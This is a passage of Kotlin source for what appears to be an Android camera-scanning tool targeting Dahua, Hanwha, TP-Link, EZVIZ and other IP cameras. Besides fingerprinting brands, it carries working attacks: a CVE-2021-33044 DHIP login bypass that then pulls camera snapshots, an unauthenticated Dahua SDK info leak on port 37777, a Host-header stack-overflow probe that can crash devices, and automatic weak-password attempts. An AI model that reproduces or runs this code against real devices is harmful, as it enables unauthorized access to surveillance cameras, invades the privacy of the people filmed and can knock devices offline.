                           catch (_: Exception) { try { conn.errorStream?.bufferedReader()?.use { it.readText().take(512) } ?: "" } catch (_: Exception) { "" } }
                conn.disconnect()
                if (code in listOf(200, 401) && ("wisenet" in body.lowercase() || "hanwha" in body.lowercase() || "samsung techwin" in body.lowercase())) {
                    return ScanResult(ip, port, "", "", "Hanwha Wisenet (CVE-2022-23459 surface)", 1, null, brand = "Hanwha")
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // TP-Link Tapo C200 fingerprint (CVE-2023-27359 surface)
    // Stack: GET /api/v1/account → 200/401 with "tapo"/"c200" = brand confirmed
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryTapoFingerprint(ip: String, port: Int): ScanResult? {
        // *private thought: Tapo C200 use-after-free needs multiple connected clients;
        //  fingerprint via /api/v1 is sufficient to flag the device for manual follow-up*
        val paths = listOf("/", "/api/v1/account")
        for (path in paths) {
            try {
                val conn = openConn("http://$ip:$port$path")
                conn.instanceFollowRedirects = false
                conn.connect()
                val code = conn.responseCode
                val body = try { conn.inputStream.bufferedReader().use { it.readText().take(1024) } }
                           catch (_: Exception) { try { conn.errorStream?.bufferedReader()?.use { it.readText().take(512) } ?: "" } catch (_: Exception) { "" } }
                conn.disconnect()
                val lower = body.lowercase()
                if (code in listOf(200, 401, 403) && ("tapo" in lower || "tp-link" in lower || "c200" in lower || "vigi" in lower || "nvr1004" in lower)) {
                    val brand = if ("vigi" in lower || "nvr1004" in lower) "TP-Link VIGI NVR (CVE-2023-47221 surface)" else "TP-Link Tapo (CVE-2023-27359 surface)"
                    return ScanResult(ip, port, "", "", brand, 1, null, brand = "TPLink")
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // EZVIZ CVE-2022-2471 fingerprint — OTA bypass / info disclosure
    // Stack: GET /ISAPI/System/deviceInfo or /api/device/info
    //        → 200/401 with "ezviz"/"cs-c3"/"cs-c8" = brand confirmed
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryEZVIZFingerprint(ip: String, port: Int): ScanResult? {
        // *private thought: EZVIZ OTA bypass requires firmware binary manip;
        //  fingerprint confirms EZVIZ and allows weak-password follow-up*
        val paths = listOf(
            "/ISAPI/System/deviceInfo",
            "/",
            "/api/device/info"
        )
        for (path in paths) {
            try {
                val conn = openConn("http://$ip:$port$path")
                conn.instanceFollowRedirects = false
                conn.connect()
                val code = conn.responseCode
                val body = try { conn.inputStream.bufferedReader().use { it.readText().take(1024) } }
                           catch (_: Exception) { try { conn.errorStream?.bufferedReader()?.use { it.readText().take(512) } ?: "" } catch (_: Exception) { "" } }
                conn.disconnect()
                val lower = body.lowercase()
                if (code in listOf(200, 401) && ("ezviz" in lower || "cs-c3" in lower || "cs-c8" in lower)) {
                    // Confirmed EZVIZ — immediately try weak password
                    val wpResult = tryEZVIZWeakPassword(ip, port)
                    if (wpResult != null) return wpResult
                    return ScanResult(ip, port, "", "", "EZVIZ Camera (CVE-2022-2471 surface)", 1, null, brand = "EZVIZ")
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2025-31700 — Dahua ONVIF Host header stack overflow (bastionne port)
    // [context: Android, TCP, HTTP/1.1 raw socket, ARM64]
    //
    // Vulnerability: Dahua NVR/DVR/IPC processes ONVIF SOAP POST on
    //   /onvif/device_service — the Host header value is copied into a
    //   fixed-size stack buffer WITHOUT bounds check, causing stack overflow.
    //   Confirmed on Dahua firmware ≤ late 2024, affects wide model range.
    //   See cve_2025_31700_affected_models.txt in bastionne.
    //
    // Probe logic (safe — no ROP payload, just overflow with cyclic pattern):
    //   1. Build POST /onvif/device_service HTTP/1.1\r\n
    //      Host: <512 bytes cyclic>\r\n
    //      Content-Type: application/soap+xml\r\n
    //      Content-Length: 0\r\n\r\n
    //   2. If device answers with 4xx/5xx → NOT vulnerable (has bounds check)
    //      If connection resets/times out → likely crashed = VULNERABLE
    //      If 2xx/3xx → vulnerable and still alive (rare firmware variant)
    //
    // Entry points affected registers (ARM Cortex-A7/A53):
    //   SP = stack base, LR = clobbered by overrun, PC control after ret
    //   Stack frame: 32–128 bytes before Host buffer in tested firmwares
    //
    // Side effects: target may reboot/crash. Probe-only version here.
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2025_31700(ip: String, port: Int): ScanResult? {
        // *private thought: the cyclic pattern lets us fingerprint the crash offset
        //  if we ever get a coredump back — pure research value, not weaponized here*
        try {
            val socket = Socket()
            socket.connect(InetSocketAddress(ip, port), TIMEOUT_CONNECT)
            socket.soTimeout = TIMEOUT_HTTP

            // 512-byte de Bruijn cyclic pattern (de Bruijn B(62,4), truncated)
            // Avoids NUL bytes and ']' to pass sanitizePayload logic
            val alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
            val cyclic = StringBuilder(512)
            // Simple AAAB AAAC AAAD style pattern — enough to confirm overflow
            outer@ for (a in alphabet) {
                for (b in alphabet) {
                    for (c in alphabet) {
                        for (d in alphabet) {
                            cyclic.append(a).append(b).append(c).append(d)
                            if (cyclic.length >= 512) break@outer
                        }
                    }
                }
            }
            val pattern = cyclic.toString().take(512)

            val req = buildString {
                append("POST /onvif/device_service HTTP/1.1\r\n")
                append("Host: $pattern\r\n")
                append("Content-Type: application/soap+xml; charset=utf-8\r\n")
                append("Content-Length: 0\r\n")
                append("Connection: close\r\n")
                append("\r\n")
            }

            socket.getOutputStream().write(req.toByteArray(Charsets.ISO_8859_1))
            socket.getOutputStream().flush()

            // Read response: 4xx/5xx = patched, 2xx/3xx = vulnerable alive,
            // IOException/reset = likely crashed = vulnerable
            return try {
                val buf = ByteArray(256)
                val n = socket.getInputStream().read(buf)
                socket.close()
                if (n <= 0) {
                    // empty read after write = connection closed abruptly = crash indicator
                    ScanResult(ip, port, "", "",
                        "Dahua ONVIF overflow probe (CVE-2025-31700) — possible crash",
                        1, null, brand = "Dahua")
                } else {
                    val statusLine = String(buf, 0, minOf(n, 32), Charsets.ISO_8859_1)
                        .trimEnd()
                    // 4xx/5xx means the device rejected the oversized Host → patched
                    val code = statusLine.substringAfter("HTTP/1.1 ").take(3).trim()
                    if (code.startsWith("4") || code.startsWith("5")) {
                        null  // not vulnerable
                    } else {
                        // 200 or 301 → device accepted the overflow = vulnerable
                        ScanResult(ip, port, "", "",
                            "Dahua ONVIF overflow (CVE-2025-31700) — responded $code",
                            1, null, brand = "Dahua")
                    }
                }
            } catch (_: java.net.SocketException) {
                // Connection reset by peer = crash = vulnerable
                try { socket.close() } catch (_: Exception) {}
                ScanResult(ip, port, "", "",
                    "Dahua ONVIF overflow (CVE-2025-31700) — connection reset (crash)",
                    1, null, brand = "Dahua")
            } catch (_: java.net.SocketTimeoutException) {
                // Timeout after write — device hung = probable crash
                try { socket.close() } catch (_: Exception) {}
                ScanResult(ip, port, "", "",
                    "Dahua ONVIF overflow (CVE-2025-31700) — timeout (hang/crash)",
                    1, null, brand = "Dahua")
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Dahua SDK noauth info leak — TCP port 37777, binary protocol (poc6117)
    // [context: Android, TCP raw socket, little-endian binary, no auth required]
    //
    // Dahua DVR/NVR/IPC expose a proprietary SDK service on TCP 37777.
    // Without any authentication, sending a 32-byte `0xa4` command packet
    // returns device info in plaintext starting at offset 32 of the response.
    //
    // Packet layout (32 bytes, all zeros except):
    //   byte[0]  = 0xa4         (magic / command class)
    //   byte[8]  = opcode       (0x07 = serial number, 0x0b = model, 0x01 = channels)
    //   bytes[4:8] = payload length (LE uint32) — 0 for queries
    //
    // Response layout:
    //   bytes[0:32] = response header (mirrors request structure)
    //   bytes[32:]  = null-terminated ASCII string payload
    //
    // Opcodes used:
    //   0x07 → serialNumber string
    //   0x0b → deviceType/model string
    //   0x01 → channel info block (count channels by counting "&&" separators)
    //
    // Affected: virtually all Dahua DVR/NVR firmware on TCP 37777
    // CVE reference: CVE-2021-33038 family, public since 2017 in bastionne poc6117
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryDahuaSDKNoAuth(ip: String): ScanResult? {
        // *private thought: 37777 is almost always open on Dahua — it's their SDK port,
        //  enabled by default, no auth on info-query commands, textbook no-auth disclosure*
        val sdkPort = 37777
        val timeout = TIMEOUT_CONNECT

        fun makePacket(op: Byte): ByteArray {
            val pkt = ByteArray(32) { 0 }
            pkt[0] = 0xa4.toByte()
            pkt[8] = op
            return pkt
        }

        fun sendQuery(op: Byte): String? {
            return try {
                val sock = Socket()
                sock.connect(InetSocketAddress(ip, sdkPort), timeout)
                sock.soTimeout = TIMEOUT_HTTP

                sock.getOutputStream().write(makePacket(op))
                sock.getOutputStream().flush()

                // Read response: wait for ≥32 bytes, then parse payload length from [4:8]
                val buf = ByteArrayOutputStream()
                val tmp = ByteArray(2048)
                var totalRead = 0
                var payloadLen = 0
                while (true) {
                    val n = try { sock.getInputStream().read(tmp) } catch (_: Exception) { -1 }
                    if (n <= 0) break
                    buf.write(tmp, 0, n)
                    totalRead += n
                    if (totalRead >= 32 && payloadLen == 0) {
                        val bytes = buf.toByteArray()
                        payloadLen = ((bytes[4].toInt() and 0xFF)
                            or ((bytes[5].toInt() and 0xFF) shl 8)
                            or ((bytes[6].toInt() and 0xFF) shl 16)
                            or ((bytes[7].toInt() and 0xFF) shl 24))
                    }
                    if (payloadLen > 0 && totalRead >= 32 + payloadLen) break
                    if (totalRead > 4096) break
                }
                sock.close()

                val data = buf.toByteArray()
                if (data.size <= 32) return null

                // Payload starts at offset 32, null-terminated
                val payload = data.drop(32).toByteArray()
                val nullIdx = payload.indexOf(0)
                val text = if (nullIdx > 0) {
                    String(payload, 0, nullIdx, Charsets.ISO_8859_1)
                } else {
                    String(payload, Charsets.ISO_8859_1)
                }.trim()
                if (text.isNotEmpty()) text else null
            } catch (_: Exception) { null }
        }

        val serial = sendQuery(0x07) ?: return null  // non-null serial = device is alive on SDK port
        val model  = sendQuery(0x0b) ?: "Dahua"
        val chanBody = sendQuery(0x01) ?: ""
        val channels = if (chanBody.isNotEmpty()) chanBody.count { it == '&' }.div(2).plus(1).coerceAtLeast(1) else 1

        return ScanResult(
            ip    = ip,
            port  = sdkPort,
            login = "",
            pass  = "",
            vuln  = "Dahua SDK noauth info leak (poc6117) — serial=$serial model=$model channels=$channels",
            channels = channels,
            snapshot = null,
            brand = "Dahua"
        )
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2021-33044 DHIP binary bypass (bastionne cve_2021_33044.go port)
    // [context: Android, TCP raw socket, DHIP binary protocol, port 5000, ARM64]
    //
    // Dahua DHIP is a proprietary binary-framed JSON RPC protocol running on TCP 5000.
    // The `clientType: "NetKeyboard"` bypass skips password validation entirely:
    //   send global.login with passwordType:"Default", clientType:"NetKeyboard"
    //   → camera returns result:true WITHOUT checking the password field
    //
    // Wire format (32-byte header + JSON body):
    //   bytes[0:8]  = magic \x20\x00\x00\x00DHIP
    //   bytes[8:12] = session id (LE uint32)
    //   bytes[12:16]= request id (LE uint32)
    //   bytes[16:20]= body length (LE uint32)     ← MUST be exact
    //   bytes[20:24]= 0x00000000 (packet index)
    //   bytes[24:28]= body length again (LE uint32) ← msgLen field
    //   bytes[28:32]= 0x00000000 (data length)
    //
    // Response parsing:
    //   Scan response stream for magic bytes, then read header + body.
    //   Check "result":true to confirm bypass success.
    //   On success, extract session id from "session" field for follow-up calls.
    //
    // This is the BINARY TCP path — completely different from HTTP /RPC2_Login.
    // Adds coverage for cameras with HTTP interface disabled but TCP 5000 open.
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2021_33044_DHIP(ip: String): ScanResult? {
        // *private thought: DHIP magic is 0x20 0x00 0x00 0x00 'D' 'H' 'I' 'P' —
        //  the 0x20 at byte[0] is the frame type/version byte in Dahua's SDK spec*
        val dhipPort = 5000
        val magic = byteArrayOf(0x20, 0x00, 0x00, 0x00, 0x44, 0x48, 0x49, 0x50) // " \0\0\0DHIP"

        fun buildFrame(sessionId: Int, reqId: Int, bodyJson: String): ByteArray {
            val bodyBytes = bodyJson.toByteArray(Charsets.UTF_8)
            val len = bodyBytes.size
            val hdr = ByteArray(32) { 0 }
            // magic
            System.arraycopy(magic, 0, hdr, 0, 8)
            // session (LE)
            hdr[8]  = (sessionId and 0xFF).toByte()
            hdr[9]  = ((sessionId shr 8) and 0xFF).toByte()
            hdr[10] = ((sessionId shr 16) and 0xFF).toByte()
            hdr[11] = ((sessionId shr 24) and 0xFF).toByte()
            // request id (LE)
            hdr[12] = (reqId and 0xFF).toByte()
            hdr[13] = ((reqId shr 8) and 0xFF).toByte()
            hdr[14] = ((reqId shr 16) and 0xFF).toByte()
            hdr[15] = ((reqId shr 24) and 0xFF).toByte()
            // body length (bytes[16:20])
            hdr[16] = (len and 0xFF).toByte()
            hdr[17] = ((len shr 8) and 0xFF).toByte()
            hdr[18] = ((len shr 16) and 0xFF).toByte()
            hdr[19] = ((len shr 24) and 0xFF).toByte()
            // bytes[20:24] = packet index = 0 already
            // msgLen (bytes[24:28])
            hdr[24] = (len and 0xFF).toByte()
            hdr[25] = ((len shr 8) and 0xFF).toByte()
            hdr[26] = ((len shr 16) and 0xFF).toByte()
            hdr[27] = ((len shr 24) and 0xFF).toByte()
            // bytes[28:32] = dataLen = 0 already
            return hdr + bodyBytes
        }

        // Scan incoming bytes for DHIP magic, then parse one frame
        fun readResponse(inputStream: java.io.InputStream): String? {
            val window = ArrayDeque<Byte>(32)
            val allBytes = ByteArrayOutputStream()

            // scan for magic pattern in stream
            val tmpBuf = ByteArray(1)
            var magicFound = false
            val deadline = System.currentTimeMillis() + TIMEOUT_HTTP
            while (System.currentTimeMillis() < deadline) {
                val n = try { inputStream.read(tmpBuf) } catch (_: Exception) { return null }
                if (n <= 0) continue
                val b = tmpBuf[0]
                window.addLast(b)
                if (window.size > 32) window.removeFirst()

                // check if last 8 bytes match magic
                if (window.size >= 8) {
                    val tail = window.toList().takeLast(8)
                    if (tail[0] == 0x20.toByte() && tail[1] == 0x00.toByte()
                        && tail[2] == 0x00.toByte() && tail[3] == 0x00.toByte()
                        && tail[4] == 0x44.toByte() && tail[5] == 0x48.toByte()
                        && tail[6] == 0x49.toByte() && tail[7] == 0x50.toByte()) {
                        // magic found — write it and read remaining 24 header bytes
                        allBytes.write(tail.map { it }.toByteArray())
                        magicFound = true
                        break
                    }
                }
            }
            if (!magicFound) return null

            // read rest of 32-byte header (24 more bytes already have magic 8 bytes)
            val hdrRest = ByteArray(24)
            var off = 0
            while (off < 24) {
                val n = try { inputStream.read(hdrRest, off, 24 - off) } catch (_: Exception) { return null }
                if (n <= 0) return null
                off += n
            }
            allBytes.write(hdrRest)

            val hdrAll = allBytes.toByteArray()
            if (hdrAll.size < 32) return null

            // parse body length from bytes[16:20] (little-endian)
            val bodyLen = ((hdrAll[16].toInt() and 0xFF)
                or ((hdrAll[17].toInt() and 0xFF) shl 8)
                or ((hdrAll[18].toInt() and 0xFF) shl 16)
                or ((hdrAll[19].toInt() and 0xFF) shl 24))

            if (bodyLen <= 0 || bodyLen > 4 * 1024 * 1024) return null

            val bodyBuf = ByteArray(bodyLen)
            var bodyOff = 0
            while (bodyOff < bodyLen) {
                val n = try { inputStream.read(bodyBuf, bodyOff, bodyLen - bodyOff) } catch (_: Exception) { return null }
                if (n <= 0) return null
                bodyOff += n
            }
            return String(bodyBuf, Charsets.UTF_8)
        }

        try {
            val sock = Socket()
            sock.connect(InetSocketAddress(ip, dhipPort), TIMEOUT_CONNECT)
            sock.soTimeout = TIMEOUT_HTTP

            // Send bypass packet: clientType=NetKeyboard, loginType=Direct
            val loginBody = """{"method":"global.login","params":{"userName":"admin","password":"Not Used","clientType":"NetKeyboard","loginType":"Direct","authorityType":"Default","passwordType":"Default"},"id":1,"session":0}"""
            val frame = buildFrame(0, 1, loginBody)
            sock.getOutputStream().write(frame)
            sock.getOutputStream().flush()

            // Read response and check for "result":true
            val resp = readResponse(sock.getInputStream())
            sock.close()

            if (resp != null && (resp.contains("\"result\":true") || resp.contains("\"result\": true"))) {
                // bypass succeeded — try follow-up HTTP snapshot via port 80/8000
                val snapPort = if (checkPortOpen(ip, 80)) 80 else if (checkPortOpen(ip, 8000)) 8000 else null
                val snap = if (snapPort != null) {
                    tryDigestSnapshot(ip, snapPort, "admin", "",
                        listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                } else null
                return ScanResult(ip, dhipPort, "admin", "Not Used",
                    "Dahua DHIP binary bypass (CVE-2021-33044, NetKeyboard)", 1, snap, brand = "Dahua")
            }

            return null
        } catch (_: Exception) {}
        return null
    }

    // Quick TCP reachability check (used by DHIP bypass to find HTTP snapshot port)
    private fun checkPortOpen(ip: String, port: Int): Boolean {
        return try {
            val s = Socket()
            s.connect(InetSocketAddress(ip, port), 1500)
            s.close()
            true
        } catch (_: Exception) { false }
    }

}

// ─────────────────────────────────────────────────────────────────────────────
// IngramFingerprint — rules.csv brand fingerprinting ported to Kotlin
// Used by DahuaScanner.matchBrand() as additional detection pass.
//
// Entry point: IngramFingerprint.detect(title, headers, body) → brand? : String
// All 32 rules from Ingram rules.csv implemented as fast string checks.
// ─────────────────────────────────────────────────────────────────────────────
object IngramFingerprint {

    // *private thought: rules.csv is just a declarative CSV, porting to Kotlin
    //  means a when-chain — same logic, zero regex overhead for simple matches*

    /**
     * Probe result from HTTP GET / on a camera port.
     * @param title  HTML <title> content (lowercase)
     * @param headers All response headers as single concatenated string (lowercase)
     * @param body   Response body (lowercase, first 8KB)
     * @param path   Path that was requested (e.g. "/" or "/login.rsp")
     */
    data class ProbeResult(
        val title: String,
        val headers: String,
        val body: String,
        val path: String = "/"
    )

    /**
     * Run all Ingram fingerprint rules against a probe result.
     * Returns the detected brand slug, or null if no rule matches.
     */
    fun detect(probe: ProbeResult): String? {
        val t = probe.title
        val h = probe.headers
        val b = probe.body

        // avtech — "::: Login :::" or "Remote Surveillance" + "Any time & Any where"
        if (t.contains("::: login :::")) return "avtech"
        if (t.contains("remote surveillance") && t.contains("any time") && b.contains("any where")) return "avtech"

        // axis — favicon md5 check skipped (we don't compute md5 at probe time)
        // Axis is detected by VAPIX endpoints in parent matchBrand

        // cctv — body markers
        if (b.contains("ip surveillance for your life")) return "cctv"
        if (b.contains("/nobody/logindevice.js")) return "cctv"
        if (h.contains("jaws")) return "cctv"

        // dahua — already handled by parent, but catch additional headers
        // dahua favicon md5 skipped

        // dlink-dcs — realm header
        if (h.contains("realm=\"dcs") || h.contains("realm=dcs")) return "dlink-dcs"

        // dvr — /login.rsp with title "LOGIN"
        if (probe.path == "/login.rsp" && t.contains("login")) return "dvr"

        // geovision
        if (t.contains("geovision")) return "geovision"

        // hikvision — already handled in parent, but extra header checks
        if (b.contains("doc/page/login.asp")) return "hikvision"
        if (b.contains("g_szcachetime") && b.contains("ivms")) return "hikvision"
        if (h.contains("app-webs") || h.contains("dvrdvs-webs") ||
            h.contains("dnvrs-webs") || h.contains("hikvision-webs") ||
            h.contains("_goaheadwebsessionid")) return "hikvision"
        if (t.contains("hikvision")) return "hikvision"

        // instar
        if (t.contains("instar") && t.contains("camera")) return "instar"

        // ipcamera — IPCamera header + 401 status (handled by caller setting headers)
        if (h.contains("ipcamera")) return "ipcamera"

        // netwave
        if (h.contains("netwave ip camera")) return "netwave"

        // nuuo
        if (t.contains("network video recorder login")) return "nuuo"

        // reecam
        if (h.contains("reecam ip camera")) return "reecam"

        // tenda — multiple title variants
        if (t.contains("tenda | login") || t.contains("tenda|login") ||
            t.contains("tenda | web master") || t.contains("tenda | wireless router") ||
            t.contains("tenda")) return "tenda"

        // uniview — favicon md5 skipped, detect via body/title
        if (t.contains("uniview") || b.contains("uniview")) return "uniview"

        // xiongmai
        if (t.contains("netsurveillance web") || t.contains("netsurveillance web")) return "xiongmai"
        if (b.contains("netsurveillance") || b.contains("xm530")) return "xiongmai"

        return null
    }

    /**
     * Quick single-GET probe helper. Used in DahuaScanner.matchBrand() additions.
     * Opens http://ip:port/path, collects title+headers+body, returns ProbeResult.
     */
    fun probe(ip: String, port: Int, path: String = "/"): ProbeResult? {
        try {
            val url = URL("http://$ip:$port$path")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 2000
            conn.readTimeout   = 3000
            conn.instanceFollowRedirects = true
            conn.connect()

            val headers = conn.headerFields.entries.joinToString("\n") { (k, v) ->
                "${k ?: ""}=${v.joinToString(",")}"
            }.lowercase()

            val body = try {
                conn.inputStream.bufferedReader().use { it.readText().take(8192) }.lowercase()
            } catch (_: Exception) {
                try {
                    conn.errorStream?.bufferedReader()?.use { it.readText().take(2048) }?.lowercase() ?: ""
                } catch (_: Exception) { "" }
            }
            conn.disconnect()

            // Extract <title>
            val titleMatch = Regex("<title[^>]*>([^<]+)</title>", RegexOption.IGNORE_CASE).find(body)
            val title = titleMatch?.groupValues?.get(1)?.lowercase() ?: ""

            return ProbeResult(title = title, headers = headers, body = body, path = path)
        } catch (_: Exception) {}
        return null
    }
}
